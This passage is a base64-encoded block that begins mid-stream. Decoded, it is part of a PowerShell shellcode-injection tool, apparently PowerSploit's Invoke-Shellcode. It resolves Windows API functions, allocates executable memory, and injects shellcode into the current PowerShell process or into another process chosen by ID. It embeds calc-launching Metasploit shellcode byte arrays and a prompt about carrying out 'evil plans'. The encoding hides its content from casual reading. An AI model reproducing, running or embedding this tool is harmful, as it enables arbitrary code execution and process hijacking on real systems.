GhlICRTaGVsbGNvZGU2NCB2YXJpYWJsZSEnCgogICAgICAgICAgICAgICAgcmV0dXJuCgogICAgICAgICAgICB9CgogICAgICAgICAgICAKCiAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlNjQKCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDY0LWJpdCBzaGVsbGNvZGUuJwoKICAgICAgICB9CgogICAgCgogICAgICAgICMgQWxsb2NhdGUgUldYIG1lbW9yeSBmb3IgdGhlIHNoZWxsY29kZQoKICAgICAgICAkQmFzZUFkZHJlc3MgPSAkVmlydHVhbEFsbG9jLkludm9rZShbSW50UHRyXTo6WmVybywgJFNoZWxsY29kZS5MZW5ndGggKyAxLCAweDMwMDAsIDB4NDApICMgKFJlc2VydmV8Q29tbWl0LCBSV1gpCgogICAgICAgIGlmICghJEJhc2VBZGRyZXNzKQoKICAgICAgICB7CgogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIHNoZWxsY29kZSBtZW1vcnkgaW4gUElEOiAkUHJvY2Vzc0lEIgoKICAgICAgICB9CgogICAgICAgIAoKICAgICAgICBXcml0ZS1WZXJib3NlICJTaGVsbGNvZGUgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkQmFzZUFkZHJlc3MuVG9TdHJpbmcoIlgkKFtJbnRQdHJdOjpTaXplKjIpIikpIgoKCgogICAgICAgICMgQ29weSBzaGVsbGNvZGUgdG8gUldYIGJ1ZmZlcgoKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRTaGVsbGNvZGUsIDAsICRCYXNlQWRkcmVzcywgJFNoZWxsY29kZS5MZW5ndGgpCgogICAgICAgIAoKICAgICAgICAjIEdldCBhZGRyZXNzIG9mIEV4aXRUaHJlYWQgZnVuY3Rpb24KCiAgICAgICAgJEV4aXRUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBFeGl0VGhyZWFkCgogICAgICAgIAoKICAgICAgICBpZiAoJFBvd2VyU2hlbGwzMmJpdCkKCiAgICAgICAgewoKICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkQmFzZUFkZHJlc3MgJEV4aXRUaHJlYWRBZGRyIDMyCgogICAgICAgICAgICAKCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0VtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuJwoKICAgICAgICB9CgogICAgICAgIGVsc2UKCiAgICAgICAgewoKICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkQmFzZUFkZHJlc3MgJEV4aXRUaHJlYWRBZGRyIDY0CgogICAgICAgICAgICAKCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0VtaXR0aW5nIDY0LWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuJwoKICAgICAgICB9CgoKCiAgICAgICAgIyBBbGxvY2F0ZSBSV1ggbWVtb3J5IGZvciB0aGUgdGhyZWFkIGNhbGwgc3R1YgoKICAgICAgICAkQ2FsbFN0dWJBZGRyZXNzID0gJFZpcnR1YWxBbGxvYy5JbnZva2UoW0ludFB0cl06Olplcm8sICRDYWxsU3R1Yi5MZW5ndGggKyAxLCAweDMwMDAsIDB4NDApICMgKFJlc2VydmV8Q29tbWl0LCBSV1gpCgogICAgICAgIGlmICghJENhbGxTdHViQWRkcmVzcykKCiAgICAgICAgewoKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSB0aHJlYWQgY2FsbCBzdHViLiIKCiAgICAgICAgfQoKICAgICAgICAKCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiVGhyZWFkIGNhbGwgc3R1YiBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRDYWxsU3R1YkFkZHJlc3MuVG9TdHJpbmcoIlgkKFtJbnRQdHJdOjpTaXplKjIpIikpIgoKCgogICAgICAgICMgQ29weSBjYWxsIHN0dWIgdG8gUldYIGJ1ZmZlcgoKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRDYWxsU3R1YiwgMCwgJENhbGxTdHViQWRkcmVzcywgJENhbGxTdHViLkxlbmd0aCkKCgoKICAgICAgICAjIExhdW5jaCBzaGVsbGNvZGUgaW4gaXQncyBvd24gdGhyZWFkCgogICAgICAgICRUaHJlYWRIYW5kbGUgPSAkQ3JlYXRlVGhyZWFkLkludm9rZShbSW50UHRyXTo6WmVybywgMCwgJENhbGxTdHViQWRkcmVzcywgJEJhc2VBZGRyZXNzLCAwLCBbSW50UHRyXTo6WmVybykKCiAgICAgICAgaWYgKCEkVGhyZWFkSGFuZGxlKQoKICAgICAgICB7CgogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGxhdW5jaCB0aHJlYWQuIgoKICAgICAgICB9CgoKCiAgICAgICAgIyBXYWl0IGZvciBzaGVsbGNvZGUgdGhyZWFkIHRvIHRlcm1pbmF0ZQoKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdC5JbnZva2UoJFRocmVhZEhhbmRsZSwgMHhGRkZGRkZGRikgfCBPdXQtTnVsbAoKICAgICAgICAKCiAgICAgICAgJFZpcnR1YWxGcmVlLkludm9rZSgkQ2FsbFN0dWJBZGRyZXNzLCAkQ2FsbFN0dWIuTGVuZ3RoICsgMSwgMHg4MDAwKSB8IE91dC1OdWxsICMgTUVNX1JFTEVBU0UgKDB4ODAwMCkKCiAgICAgICAgJFZpcnR1YWxGcmVlLkludm9rZSgkQmFzZUFkZHJlc3MsICRTaGVsbGNvZGUuTGVuZ3RoICsgMSwgMHg4MDAwKSB8IE91dC1OdWxsICMgTUVNX1JFTEVBU0UgKDB4ODAwMCkKCgoKICAgICAgICBXcml0ZS1WZXJib3NlICdTaGVsbGNvZGUgaW5qZWN0aW9uIGNvbXBsZXRlIScKCiAgICB9CgoKCiAgICAjIEEgdmFsaWQgcG9pbnRlciB0byBJc1dvdzY0UHJvY2VzcyB3aWxsIGJlIHJldHVybmVkIGlmIENQVSBpcyA2NC1iaXQKCiAgICAkSXNXb3c2NFByb2Nlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBJc1dvdzY0UHJvY2VzcwoKCgogICAgJEFkZHJlc3NXaWR0aCA9ICRudWxsCgoKCiAgICB0cnkgewoKICAgICAgICAkQWRkcmVzc1dpZHRoID0gQChHZXQtV21pT2JqZWN0IC1RdWVyeSAnU0VMRUNUIEFkZHJlc3NXaWR0aCBGUk9NIFdpbjMyX1Byb2Nlc3NvcicpWzBdIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgQWRkcmVzc1dpZHRoCgogICAgfSBjYXRjaCB7CgogICAgICAgIHRocm93ICdVbmFibGUgdG8gZGV0ZXJtaW5lIE9TIHByb2Nlc3NvciBhZGRyZXNzIHdpZHRoLicKCiAgICB9CgoKCiAgICBzd2l0Y2ggKCRBZGRyZXNzV2lkdGgpIHsKCiAgICAgICAgJzMyJyB7CgogICAgICAgICAgICAkNjRiaXRPUyA9ICRGYWxzZQoKICAgICAgICB9CgoKCiAgICAgICAgJzY0JyB7CgogICAgICAgICAgICAkNjRiaXRPUyA9ICRUcnVlCgoKCiAgICAgICAgICAgICRJc1dvdzY0UHJvY2Vzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbQm9vbF0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQoKICAgIAkgICAgJElzV293NjRQcm9jZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJElzV293NjRQcm9jZXNzQWRkciwgJElzV293NjRQcm9jZXNzRGVsZWdhdGUpCgogICAgICAgIH0KCgoKICAgICAgICBkZWZhdWx0IHsKCiAgICAgICAgICAgIHRocm93ICdJbnZhbGlkIE9TIGFkZHJlc3Mgd2lkdGggZGV0ZWN0ZWQuJwoKICAgICAgICB9CgogICAgfQoKCgogICAgaWYgKFtJbnRQdHJdOjpTaXplIC1lcSA0KQoKICAgIHsKCiAgICAgICAgJFBvd2VyU2hlbGwzMmJpdCA9ICR0cnVlCgogICAgfQoKICAgIGVsc2UKCiAgICB7CgogICAgICAgICRQb3dlclNoZWxsMzJiaXQgPSAkZmFsc2UKCiAgICB9CgoKCiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTaGVsbGNvZGUnXSkKCiAgICB7CgogICAgICAgICMgVXNlcnMgcGFzc2luZyBpbiBzaGVsbGNvZGUgIHRocm91Z2ggdGhlICctU2hlbGxjb2RlJyBwYXJhbWV0ZXIgYXJlIHJlc3BvbnNpYmxlIGZvciBlbnN1cmluZyBpdCB0YXJnZXRzCgogICAgICAgICMgdGhlIGNvcnJlY3QgYXJjaGl0ZWNodHVyZSAtIHg4NiB2cy4geDY0LiBUaGlzIHNjcmlwdCBoYXMgbm8gd2F5IHRvIHZhbGlkYXRlIHdoYXQgeW91IHByb3ZpZGUgaXQuCgogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGUzMiA9ICRTaGVsbGNvZGUKCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTY0ID0gJFNoZWxsY29kZTMyCgogICAgfQoKICAgIGVsc2UKCiAgICB7CgogICAgICAgICMgUG9wIGEgY2FsYy4uLiBvciB3aGF0ZXZlciBzaGVsbGNvZGUgeW91IGRlY2lkZSB0byBwbGFjZSBpbiBoZXJlCgogICAgICAgICMgSSBzaW5jZXJlbHkgaG9wZSB5b3UgdHJ1c3QgdGhhdCB0aGlzIHNoZWxsY29kZSBhY3R1YWxseSBwb3BzIGEgY2FsYy4uLgoKICAgICAgICAjIEluc2VydCB5b3VyIHNoZWxsY29kZSBoZXJlIGluIHRoZSBmb3IgMHhYWCwweFhYLC4uLgoKICAgICAgICAjIDMyLWJpdCBwYXlsb2FkCgogICAgICAgICMgbXNmcGF5bG9hZCB3aW5kb3dzL2V4ZWMgQ01EPSJjbWQgL2sgY2FsYyIgRVhJVEZVTkM9dGhyZWFkCgogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGUzMiA9IEAoMHhmYywweGU4LDB4ODksMHgwMCwweDAwLDB4MDAsMHg2MCwweDg5LDB4ZTUsMHgzMSwweGQyLDB4NjQsMHg4YiwweDUyLDB4MzAsMHg4YiwKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDUyLDB4MGMsMHg4YiwweDUyLDB4MTQsMHg4YiwweDcyLDB4MjgsMHgwZiwweGI3LDB4NGEsMHgyNiwweDMxLDB4ZmYsMHgzMSwweGMwLAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4YWMsMHgzYywweDYxLDB4N2MsMHgwMiwweDJjLDB4MjAsMHhjMSwweGNmLDB4MGQsMHgwMSwweGM3LDB4ZTIsMHhmMCwweDUyLDB4NTcsCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4YiwweDUyLDB4MTAsMHg4YiwweDQyLDB4M2MsMHgwMSwweGQwLDB4OGIsMHg0MCwweDc4LDB4ODUsMHhjMCwweDc0LDB4NGEsMHgwMSwKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGQwLDB4NTAsMHg4YiwweDQ4LDB4MTgsMHg4YiwweDU4LDB4MjAsMHgwMSwweGQzLDB4ZTMsMHgzYywweDQ5LDB4OGIsMHgzNCwweDhiLAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHhkNiwweDMxLDB4ZmYsMHgzMSwweGMwLDB4YWMsMHhjMSwweGNmLDB4MGQsMHgwMSwweGM3LDB4MzgsMHhlMCwweDc1LDB4ZjQsCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMywweDdkLDB4ZjgsMHgzYiwweDdkLDB4MjQsMHg3NSwweGUyLDB4NTgsMHg4YiwweDU4LDB4MjQsMHgwMSwweGQzLDB4NjYsMHg4YiwKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDBjLDB4NGIsMHg4YiwweDU4LDB4MWMsMHgwMSwweGQzLDB4OGIsMHgwNCwweDhiLDB4MDEsMHhkMCwweDg5LDB4NDQsMHgyNCwweDI0LAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NWIsMHg1YiwweDYxLDB4NTksMHg1YSwweDUxLDB4ZmYsMHhlMCwweDU4LDB4NWYsMHg1YSwweDhiLDB4MTIsMHhlYiwweDg2LDB4NWQsCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2YSwweDAxLDB4OGQsMHg4NSwweGI5LDB4MDAsMHgwMCwweDAwLDB4NTAsMHg2OCwweDMxLDB4OGIsMHg2ZiwweDg3LDB4ZmYsMHhkNSwKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGJiLDB4ZTAsMHgxZCwweDJhLDB4MGEsMHg2OCwweGE2LDB4OTUsMHhiZCwweDlkLDB4ZmYsMHhkNSwweDNjLDB4MDYsMHg3YywweDBhLAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4ODAsMHhmYiwweGUwLDB4NzUsMHgwNSwweGJiLDB4NDcsMHgxMywweDcyLDB4NmYsMHg2YSwweDAwLDB4NTMsMHhmZiwweGQ1LDB4NjMsCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2MSwweDZjLDB4NjMsMHgwMCkKCgoKICAgICAgICAjIDY0LWJpdCBwYXlsb2FkCgogICAgICAgICMgbXNmcGF5bG9hZCB3aW5kb3dzL3g2NC9leGVjIENNRD0iY2FsYyIgRVhJVEZVTkM9dGhyZWFkCgogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGU2NCA9IEAoMHhmYywweDQ4LDB4ODMsMHhlNCwweGYwLDB4ZTgsMHhjMCwweDAwLDB4MDAsMHgwMCwweDQxLDB4NTEsMHg0MSwweDUwLDB4NTIsMHg1MSwKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDU2LDB4NDgsMHgzMSwweGQyLDB4NjUsMHg0OCwweDhiLDB4NTIsMHg2MCwweDQ4LDB4OGIsMHg1MiwweDE4LDB4NDgsMHg4YiwweDUyLAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MjAsMHg0OCwweDhiLDB4NzIsMHg1MCwweDQ4LDB4MGYsMHhiNywweDRhLDB4NGEsMHg0ZCwweDMxLDB4YzksMHg0OCwweDMxLDB4YzAsCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhhYywweDNjLDB4NjEsMHg3YywweDAyLDB4MmMsMHgyMCwweDQxLDB4YzEsMHhjOSwweDBkLDB4NDEsMHgwMSwweGMxLDB4ZTIsMHhlZCwKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDUyLDB4NDEsMHg1MSwweDQ4LDB4OGIsMHg1MiwweDIwLDB4OGIsMHg0MiwweDNjLDB4NDgsMHgwMSwweGQwLDB4OGIsMHg4MCwweDg4LAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4NDgsMHg4NSwweGMwLDB4NzQsMHg2NywweDQ4LDB4MDEsMHhkMCwweDUwLDB4OGIsMHg0OCwweDE4LDB4NDQsCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4YiwweDQwLDB4MjAsMHg0OSwweDAxLDB4ZDAsMHhlMywweDU2LDB4NDgsMHhmZiwweGM5LDB4NDEsMHg4YiwweDM0LDB4ODgsMHg0OCwKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAxLDB4ZDYsMHg0ZCwweDMxLDB4YzksMHg0OCwweDMxLDB4YzAsMHhhYywweDQxLDB4YzEsMHhjOSwweDBkLDB4NDEsMHgwMSwweGMxLAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MzgsMHhlMCwweDc1LDB4ZjEsMHg0YywweDAzLDB4NGMsMHgyNCwweDA4LDB4NDUsMHgzOSwweGQxLDB4NzUsMHhkOCwweDU4LDB4NDQsCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4YiwweDQwLDB4MjQsMHg0OSwweDAxLDB4ZDAsMHg2NiwweDQxLDB4OGIsMHgwYywweDQ4LDB4NDQsMHg4YiwweDQwLDB4MWMsMHg0OSwKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAxLDB4ZDAsMHg0MSwweDhiLDB4MDQsMHg4OCwweDQ4LDB4MDEsMHhkMCwweDQxLDB4NTgsMHg0MSwweDU4LDB4NWUsMHg1OSwweDVhLAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NDEsMHg1OCwweDQxLDB4NTksMHg0MSwweDVhLDB4NDgsMHg4MywweGVjLDB4MjAsMHg0MSwweDUyLDB4ZmYsMHhlMCwweDU4LDB4NDEsCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1OSwweDVhLDB4NDgsMHg4YiwweDEyLDB4ZTksMHg1NywweGZmLDB4ZmYsMHhmZiwweDVkLDB4NDgsMHhiYSwweDAxLDB4MDAsMHgwMCwKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0OCwweDhkLDB4OGQsMHgwMSwweDAxLDB4MDAsMHgwMCwweDQxLDB4YmEsMHgzMSwweDhiLAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NmYsMHg4NywweGZmLDB4ZDUsMHhiYiwweGUwLDB4MWQsMHgyYSwweDBhLDB4NDEsMHhiYSwweGE2LDB4OTUsMHhiZCwweDlkLDB4ZmYsCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhkNSwweDQ4LDB4ODMsMHhjNCwweDI4LDB4M2MsMHgwNiwweDdjLDB4MGEsMHg4MCwweGZiLDB4ZTAsMHg3NSwweDA1LDB4YmIsMHg0NywKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDEzLDB4NzIsMHg2ZiwweDZhLDB4MDAsMHg1OSwweDQxLDB4ODksMHhkYSwweGZmLDB4ZDUsMHg2MywweDYxLDB4NmMsMHg2MywweDAwKQoKICAgIH0KCgoKICAgIGlmICggJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9jZXNzSUQnXSApCgogICAgewoKICAgICAgICAjIEluamVjdCBzaGVsbGNvZGUgaW50byB0aGUgc3BlY2lmaWVkIHByb2Nlc3MgSUQKCiAgICAgICAgJE9wZW5Qcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgT3BlblByb2Nlc3MKCiAgICAgICAgJE9wZW5Qcm9jZXNzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1VJbnQzMl0sIFtCb29sXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKCiAgICAgICAgJE9wZW5Qcm9jZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE9wZW5Qcm9jZXNzQWRkciwgJE9wZW5Qcm9jZXNzRGVsZWdhdGUpCgogICAgICAgICRWaXJ0dWFsQWxsb2NFeEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvY0V4CgogICAgICAgICRWaXJ0dWFsQWxsb2NFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VpbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXSkgKFtJbnRQdHJdKQoKICAgICAgICAkVmlydHVhbEFsbG9jRXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEFsbG9jRXhBZGRyLCAkVmlydHVhbEFsbG9jRXhEZWxlZ2F0ZSkKCiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFdyaXRlUHJvY2Vzc01lbW9yeQoKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbQnl0ZVtdXSwgW1VJbnQzMl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKCiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXcml0ZVByb2Nlc3NNZW1vcnlBZGRyLCAkV3JpdGVQcm9jZXNzTWVtb3J5RGVsZWdhdGUpCgogICAgICAgICRDcmVhdGVSZW1vdGVUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBDcmVhdGVSZW1vdGVUaHJlYWQKCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCgogICAgICAgICRDcmVhdGVSZW1vdGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlUmVtb3RlVGhyZWFkQWRkciwgJENyZWF0ZVJlbW90ZVRocmVhZERlbGVnYXRlKQoKICAgICAgICAkQ2xvc2VIYW5kbGVBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBDbG9zZUhhbmRsZQoKICAgICAgICAkQ2xvc2VIYW5kbGVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSkgKFtCb29sXSkKCiAgICAgICAgJENsb3NlSGFuZGxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENsb3NlSGFuZGxlQWRkciwgJENsb3NlSGFuZGxlRGVsZWdhdGUpCgogICAgCgogICAgICAgIFdyaXRlLVZlcmJvc2UgIkluamVjdGluZyBzaGVsbGNvZGUgaW50byBQSUQ6ICRQcm9jZXNzSWQiCgogICAgICAgIAoKICAgICAgICBpZiAoICRGb3JjZSAtb3IgJHBzQ21kbGV0LlNob3VsZENvbnRpbnVlKCAnRG8geW91IHdpc2ggdG8gY2Fycnkgb3V0IHlvdXIgZXZpbCBwbGFucz8nLAoKICAgICAgICAgICAgICAgICAiSW5qZWN0aW5nIHNoZWxsY29kZSBpbmplY3RpbmcgaW50byAkKChHZXQtUHJvY2VzcyAtSWQgJFByb2Nlc3NJZCkuUHJvY2Vzc05hbWUpICgkUHJvY2Vzc0lkKSEiICkgKQoKICAgICAgICB7CgogICAgICAgICAgICBJbmplY3QtUmVtb3RlU2hlbGxjb2RlICRQcm9jZXNzSWQKCiAgICAgICAgfQoKICAgIH0KCiAgICBlbHNlCgogICAgewoKICAgICAgICAjIEluamVjdCBzaGVsbGNvZGUgaW50byB0aGUgY3VycmVudGx5IHJ1bm5pbmcgUG93ZXJTaGVsbCBwcm9jZXNzCgogICAgICAgICRWaXJ0dWFsQWxsb2NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MKCiAgICAgICAgJFZpcnR1YWxBbGxvY0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pCgogICAgICAgICRWaXJ0dWFsQWxsb2MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEFsbG9jQWRkciwgJFZpcnR1YWxBbGxvY0RlbGVnYXRlKQoKICAgICAgICAkVmlydHVhbEZyZWVBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsRnJlZQoKICAgICAgICAkVmlydHVhbEZyZWVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VpbnQzMl0sIFtVSW50MzJdKSAoW0Jvb2xdKQoKICAgICAgICAkVmlydHVhbEZyZWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEZyZWVBZGRyLCAkVmlydHVhbEZyZWVEZWxlZ2F0ZSkKCiAgICAgICAgJENyZWF0ZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENyZWF0ZVRocmVhZAoKICAgICAgICAkQ3JlYXRlVGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKQoKICAgICAgICAkQ3JlYXRlVGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENyZWF0ZVRocmVhZEFkZHIsICRDcmVhdGVUaHJlYWREZWxlZ2F0ZSkKCiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3RBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBXYWl0Rm9yU2luZ2xlT2JqZWN0CgogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnQzMl0pIChbSW50XSkKCiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3QgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkV2FpdEZvclNpbmdsZU9iamVjdEFkZHIsICRXYWl0Rm9yU2luZ2xlT2JqZWN0RGVsZWdhdGUpCgogICAgICAgIAoKICAgICAgICBXcml0ZS1WZXJib3NlICJJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gUG93ZXJTaGVsbCIKCiAgICAgICAgCgogICAgICAgIGlmICggJEZvcmNlIC1vciAkcHNDbWRsZXQuU2hvdWxkQ29udGludWUoICdEbyB5b3Ugd2lzaCB0byBjYXJyeSBvdXQgeW91ciBldmlsIHBsYW5zPycsCgogICAgICAgICAgICAgICAgICJJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gdGhlIHJ1bm5pbmcgUG93ZXJTaGVsbCBwcm9jZXNzISIgKSApCgogICAgICAgIHsKCiAgICAgICAgICAgIEluamVjdC1Mb2NhbFNoZWxsY29kZQoKICAgICAgICB9CgogICAgfSAgIAoKfQo=
